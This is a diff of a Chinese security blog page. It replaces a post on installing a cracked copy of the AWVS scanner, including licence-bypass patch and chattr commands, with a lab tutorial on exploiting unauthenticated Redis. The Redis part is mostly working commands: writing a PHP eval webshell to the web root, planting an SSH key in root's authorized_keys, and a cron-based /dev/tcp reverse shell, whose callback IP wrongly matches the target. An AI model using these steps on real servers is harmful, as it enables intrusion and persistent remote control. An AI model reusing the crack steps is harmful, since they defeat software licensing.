@@ -16,33 +16,21 @@
   <meta name="author" content="Atkx">
   <meta name="keywords" content="">
   
-    <meta name="description" content="user:&amp;#x61;&amp;#116;&amp;#x6b;&amp;#x78;&amp;#54;&amp;#x40;&amp;#x71;&amp;#113;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#109; Passwd:&amp;#97;&amp;#116;&amp;#107;&amp;#x78;&amp;#x36;&amp;#64;&amp;#113;&amp;#113;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#109; Kali2020.1安装AWVS12 详细过程 百度网盘链接：https:&#x2F;&#x2F;pan.bai">
+    <meta name="description" content="redis未授权访问漏洞漏洞原理 redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。 没有设置密码认证（一般为空）或者设置弱口令密码，导致任何用户可以远程登录redis服务。  意思大概就是，由于管理者配置不当，导致任何人都可以（通过redis客户端）登录他的redis服务，然后搞事情。 比如删数据、写入一句话木马、上传公">
 <meta property="og:type" content="article">
-<meta property="og:title" content="漏扫工具-AWVS">
-<meta property="og:url" content="https://atkx.top/posts/2175665633/index.html">
+<meta property="og:title" content="redis未授权访问漏洞">
+<meta property="og:url" content="https://atkx.top/posts/2438404492/index.html">
 <meta property="og:site_name" content="Atkx&#39;s Blog">
-<meta property="og:description" content="user:&amp;#x61;&amp;#116;&amp;#x6b;&amp;#x78;&amp;#54;&amp;#x40;&amp;#x71;&amp;#113;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#109; Passwd:&amp;#97;&amp;#116;&amp;#107;&amp;#x78;&amp;#x36;&amp;#64;&amp;#113;&amp;#113;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#109; Kali2020.1安装AWVS12 详细过程 百度网盘链接：https:&#x2F;&#x2F;pan.bai">
+<meta property="og:description" content="redis未授权访问漏洞漏洞原理 redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。 没有设置密码认证（一般为空）或者设置弱口令密码，导致任何用户可以远程登录redis服务。  意思大概就是，由于管理者配置不当，导致任何人都可以（通过redis客户端）登录他的redis服务，然后搞事情。 比如删数据、写入一句话木马、上传公">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641780502679-787de1ec-61f2-4787-be04-ddcf02c86cd2.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641780558544-ab505141-9264-4dc5-b16b-64173b92d8e9.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641780584157-6c1130c7-6a56-4727-91f4-f541c3811a7a.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781063551-515fbdbb-cff8-4330-b3b8-fce36fc971b0.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781112371-4aad2a7c-b599-4829-9310-43fccf90c1ce.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781211796-415b20ec-eb7b-44a0-9b8d-916d2d35f521.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781398890-0e7aa638-4f86-4fcc-8bcd-ef87b8734cb0.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781458741-523379a0-d3db-48d6-bc02-5ceaf116ee21.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781491936-8b7cfbe2-9c05-4f31-8d3c-ce5fafdb44d4.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781595415-275de22b-e3fb-42e9-8f6e-10b977998cfc.png">
-<meta property="article:published_time" content="2022-05-17T12:29:28.000Z">
-<meta property="article:modified_time" content="2023-03-10T12:49:15.543Z">
+<meta property="article:published_time" content="2022-05-15T13:08:46.000Z">
+<meta property="article:modified_time" content="2023-03-15T13:09:57.604Z">
 <meta property="article:author" content="Atkx">
-<meta property="article:tag" content="漏扫">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641780502679-787de1ec-61f2-4787-be04-ddcf02c86cd2.png">
   
   
   
-  <title>漏扫工具-AWVS - Atkx&#39;s Blog</title>
+  <title>redis未授权访问漏洞 - Atkx&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -208,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="漏扫工具-AWVS"></span>
+            <span id="subtitle" data-typed-text="redis未授权访问漏洞"></span>
           
         </div>
 
@@ -219,8 +207,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-05-17 20:29" pubdate>
-          2022年5月17日 晚上
+        <time datetime="2022-05-15 21:08" pubdate>
+          2022年5月15日 晚上
         </time>
       </span>
     
@@ -231,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.7k 字
+          2.8k 字
         
       </span>
     
@@ -242,7 +230,7 @@
         
         
         
-          15 分钟
+          24 分钟
         
       </span>
     
@@ -280,66 +268,75 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">漏扫工具-AWVS</h1>
+            <h1 style="display: none">redis未授权访问漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <p>user:<a href="mailto:&#x61;&#116;&#x6b;&#x78;&#54;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;">&#x61;&#116;&#x6b;&#x78;&#54;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;</a></p>
-<p>Passwd:<a href="mailto:&#97;&#116;&#107;&#x78;&#x36;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;">&#97;&#116;&#107;&#x78;&#x36;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;</a></p>
-<p>Kali2020.1安装AWVS12 详细过程</p>
-<p>百度网盘链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/167SkNggGGOyA9Ii7GmBWpQ">https://pan.baidu.com/s/167SkNggGGOyA9Ii7GmBWpQ</a></p>
-<p>提取码：rlgt</p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>1、下载解压文件后将下图文件夹复制到kali的桌面下</p>
-<p>2、进入桌面文件夹所在位置，上级进入文件夹</p>
-<p>3、打开后在此界面打开终端</p>
-<p>4、执行如下命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> 777 acunetix_trial.sh patch_awvs<br>sudo ./acunetix_trial.sh<br></code></pre></td></tr></table></figure>
+                <h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ol>
+<li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</li>
+<li>没有设置密码认证（一般为空）或者设置弱口令密码，导致任何用户可以远程登录redis服务。</li>
+</ol>
+<p>意思大概就是，由于管理者配置不当，导致任何人都可以（通过redis客户端）登录他的redis服务，然后搞事情。 比如删数据、写入一句话木马、上传公钥登录ssh服务、反弹shell</p>
+<p><strong>管理者如何配置不当？</strong></p>
+<ol>
+<li>没有设置密码，或者设置密码为弱口令</li>
+<li>没有开启防火墙</li>
+<li>将6379端口直接暴露在公网上，允许任何人访问</li>
+<li>将将protected-mode设置为no，把保护关掉。</li>
+<li>用管理员身份运行redis服务</li>
+</ol>
+<h2 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">靶机：centos6.<span class="hljs-number">5</span><br>靶机地址：<br>攻击机：kali<br>连接工具：finallshell<br></code></pre></td></tr></table></figure>
+
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p><strong>centos靶机上安装redis</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">wget http:<span class="hljs-comment">//download.redis.io/releases/redis-3.2.0.tar.gz</span><br>tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz<br>cd redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span><br>make<br><br>cd src/ <span class="hljs-comment">#进入src目录 </span><br>cp redis-server /usr/bin/ <span class="hljs-comment">#将redis-server拷贝到/usr/bin目录下</span><br>cd ..   <span class="hljs-comment"># 返回上一级目录</span><br>cp redis.conf /etc/     <span class="hljs-comment">#将redis.conf拷贝到/etc/目录下</span><br>redis-server /etc/redis.conf  <span class="hljs-comment"># 使用/etc/目录下的redis.conf文件中的配置启动redis服务</span><br><br><br>  修改配置文件，使可以远程访问：<br>  vim redis.conf<br>bind <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>前面加上<span class="hljs-comment">#号 protected-mode设为no</span><br></code></pre></td></tr></table></figure>
+
+<p>启动redis-server：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">./src/redis-server redis.conf<br>  <br>/etc/init.d/redis-server stop        <span class="hljs-comment">#关闭</span><br>/etc/init.d/redis-server start         <span class="hljs-comment">#启动</span><br>/etc/init.d/redis-server restart        <span class="hljs-comment">#重启</span><br></code></pre></td></tr></table></figure>
+
+<p>默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。</p>
+<p><strong>kali安装redis-cli远程连接工具</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">wget http:<span class="hljs-comment">//download.redis.io/redis-stable.tar.gz</span><br>tar -zxvf redis-stable.tar.gz<br>cd redis-stable<br>make <br>cp src/redis-cli /usr/bin/<br></code></pre></td></tr></table></figure>
+
+<p>使用redis-cli命令直接远程免密登录redis主机</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">redis-cli -h 目标主机IP<br></code></pre></td></tr></table></figure>
+
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>知识点</p>
+<p>命令：CONFIG GET dir</p>
+<p>获取数据库的存储路径（文件将会保存的地方,当然可以使用SET进行设置，如果有权限的话）</p>
+<p>命令：CONFIG GET dbfilename</p>
+<p>获取数据库文件名，默认是dump.rdb（通过SET设置为webshell.php等任意文件格式，然后利用）</p>
+<p>命令：SAVE</p>
+<p>保存当前数据库（将数据库内的内容写到文件中，上面给出了文件的路径和名称）</p>
+<h3 id="利用1：获取web服务的webshell"><a href="#利用1：获取web服务的webshell" class="headerlink" title="利用1：获取web服务的webshell"></a>利用1：获取web服务的webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">182.130</span><br>  <br>set one <span class="hljs-string">&quot;\n\n\n&lt;?php @eval(<span class="hljs-subst">$_POST</span>[&#x27;c&#x27;]);?&gt;\n\n\n&quot;</span><br>  <br>config set dir  /<span class="hljs-keyword">var</span>/www/html<br>  <br>config set dbfilename shell.php<br>  <br>save<br></code></pre></td></tr></table></figure>
+
+<p>shell地址：<a target="_blank" rel="noopener" href="http://192.168.182.130/shell.php">http://192.168.182.130/shell.php</a></p>
+<h3 id="利用2：写ssh-keygen公钥登录服务器"><a href="#利用2：写ssh-keygen公钥登录服务器" class="headerlink" title="利用2：写ssh-keygen公钥登录服务器"></a>利用2：写ssh-keygen公钥登录服务器</h3><p>在以下条件下，可以利用此方法</p>
+<ul>
+<li>Redis服务使用ROOT账号启动</li>
+<li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li>
+</ul>
+<p>注:靶机是否设置了密码</p>
+<p>首先在本地生成一对密钥：<br>1、生成公钥密钥文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure>
+
+<p>2.导入公钥</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>;cat id_rsa.pub;<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>)&gt;key.txt<br></code></pre></td></tr></table></figure>
+
+<p>将公钥的内容重定向到test.txt文件里，以\n\n（相当于回车）隔开</p>
+<p>3、发送公钥</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cat key.txt | redis-cli -h ip -x set crackit<br></code></pre></td></tr></table></figure>
 
 
 
-<p>5、按下enter继续。之后会显示其他信息，可以点击空格显示更多，可以点击q键跳过。在询问是否同意安装条款点击yes</p>
-<p>6、emali和password后面会需要到。这里不需要真实的emali，密码为大写字母、小写字母、数字和特殊字符的组合</p>
-<p>7、安装成功</p>
-<p>8、上面要求访问kali_awvs:13443/。在访问之前，先进行安装破解补丁。命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cp</span> -a patch_awvs /home/acunetix/.acunetix_trial/v_190325161/scanner/<br>sudo <span class="hljs-built_in">chmod</span> 777 /home/acunetix/.acunetix_trial/v_190325161/scanner/patch_awvs<br>sudo /home/acunetix/.acunetix_trial/v_190325161/scanner/patch_awvs<br></code></pre></td></tr></table></figure>
+<p>或者直接复制公钥，连接redis执行下面的命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">192.168</span>.xxx.xxx&gt; config set dir /root/.ssh/<br>OK<br><span class="hljs-number">192.168</span>.xxx.xxx&gt; config set dbfilename authorized_keys<br>OK<br><span class="hljs-number">192.168</span>.xxx.xxx&gt; set x <span class="hljs-string">&quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</span><br>OK<br><span class="hljs-number">192.168</span>.xxx.xxx&gt; save<br>OK<br></code></pre></td></tr></table></figure>
 
-<p>为防止破解失效执行以下命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo chattr +i /home/acunetix/.acunetix_trial/data/license/license_info.json<br>sudo <span class="hljs-built_in">rm</span> -fr /home/acunetix/.acunetix_trial/data/license/wa_data.dat<br>sudo <span class="hljs-built_in">touch</span> /home/acunetix/.acunetix_trial/data/license/wa_data.dat<br>sudo chattr +i /home/acunetix/.acunetix_trial/data/license/wa_data.dat<br></code></pre></td></tr></table></figure>
+<p>4、利用公钥登录ssh</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ssh root@<span class="hljs-number">192.168</span>.<span class="hljs-number">182.130</span><br></code></pre></td></tr></table></figure>
 
-<p>重启acunetix服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl restart acunetix_trial.service<br></code></pre></td></tr></table></figure>
-
-
-
-<p>9、实验kali的浏览器访问https:127.0.0.1:13443/。开始可能会出现安全警告，不用担心，继续访问，可以看到如下界面。输入刚刚注册的邮箱和密码</p>
-<p>10、进入acunetix里</p>
-<p>11、 点击右上角的Administrator—&gt;Profile，下拉可以看到license。看到由于安装破解补丁，限制时间为2099年，用户不限。</p>
-<p>12、点击左边setting，选择不要自动更新。大功告成！</p>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="扫描测试网站"><a href="#扫描测试网站" class="headerlink" title="扫描测试网站"></a>扫描测试网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">AWVS官方提供的测试网站：<br>http://testhtml5.vulnweb.com<br>http://testphp.vulnweb.com<br>http://testasp.vulnweb.com<br>ibm提供的测试网站：<br>http://testfire.net<br></code></pre></td></tr></table></figure>
-
-<h3 id="添加Target"><a href="#添加Target" class="headerlink" title="添加Target"></a>添加Target</h3><p>填写目标的域名或者IP</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641780502679-787de1ec-61f2-4787-be04-ddcf02c86cd2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>第二栏添加描述，如果是扫描工程，可以填上日期本次扫描的目的等等。</p>
-<p>下一步</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641780558544-ab505141-9264-4dc5-b16b-64173b92d8e9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>下一半</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641780584157-6c1130c7-6a56-4727-91f4-f541c3811a7a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h3><p>点击左侧Vulnerabilities将展示扫描出来的漏洞列表。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781063551-515fbdbb-cff8-4330-b3b8-fce36fc971b0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>漏洞的颜色红、黄、蓝、绿分别对应高、中、低、无风险漏洞四种类型。<br>也可以点击右侧的过滤按钮对结果进行筛选。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781112371-4aad2a7c-b599-4829-9310-43fccf90c1ce.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>点击每个漏洞条目，会列出该漏洞的详细信息</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781211796-415b20ec-eb7b-44a0-9b8d-916d2d35f521.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="Scans"><a href="#Scans" class="headerlink" title="Scans"></a>Scans</h3><p>点击 Scans展示扫描的结果</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781398890-0e7aa638-4f86-4fcc-8bcd-ef87b8734cb0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>点进连接可以显示扫描用时和进度</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781458741-523379a0-d3db-48d6-bc02-5ceaf116ee21.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>点击Generate Report会生成扫描报告，系统也给我们提供了一些扫描报告模板。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781491936-8b7cfbe2-9c05-4f31-8d3c-ce5fafdb44d4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="Reports"><a href="#Reports" class="headerlink" title="Reports"></a>Reports</h3><p>Reports主要展示一些生成的扫描报告，可以点击右侧的download按钮下载对应的扫描报告。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781595415-275de22b-e3fb-42e9-8f6e-10b977998cfc.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-
+<h3 id="利用3：定时任务反弹shell"><a href="#利用3：定时任务反弹shell" class="headerlink" title="利用3：定时任务反弹shell"></a>利用3：定时任务反弹shell</h3><p>在redis以root权限运行时可以写crontab来执行命令反弹shell<br>原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。<br>首先在客户端这边<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%9B%91%E5%90%AC&spm=1001.2101.3001.7020">监听</a>一个端口（随便一个端口就好，不要冲突就好）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">nc -lvp <span class="hljs-number">8888</span> <span class="hljs-comment">#监听8888端口</span><br><br><br>  <br>redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">182.130</span><br><br><span class="hljs-comment">//写入反弹命令</span><br>set xxx <span class="hljs-string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.182.130/8888 0&gt;&amp;1\n\n&quot;</span><br>config set dir /<span class="hljs-keyword">var</span>/spool/cron/crontabs/<br>config set dbfilename root<br>save<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -347,34 +344,6 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E5%B7%A5%E5%85%B7/" class="category-chain-item">工具</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/%E6%BC%8F%E6%89%AB/">#漏扫</a>
-      
-    </div>
   
 </div>
 
@@ -384,8 +353,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>漏扫工具-AWVS</div>
-      <div>https://atkx.top/posts/2175665633/</div>
+      <div>redis未授权访问漏洞</div>
+      <div>https://atkx.top/posts/2438404492/</div>
     </div>
     <div class="license-meta">
       
@@ -397,7 +366,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年5月17日</div>
+          <div>2022年5月15日</div>
         </div>
       
       
@@ -429,12 +398,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/posts/2175665633/" title="漏扫工具-AWVS">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">漏扫工具-AWVS</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/2438404492/" title="redis未授权访问漏洞">
-                        <span class="hidden-mobile">redis未授权访问漏洞</span>
+                      <a href="/posts/7231741/" title="PHP代码审计简历系统">
+                        <span class="hidden-mobile">PHP代码审计简历系统</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
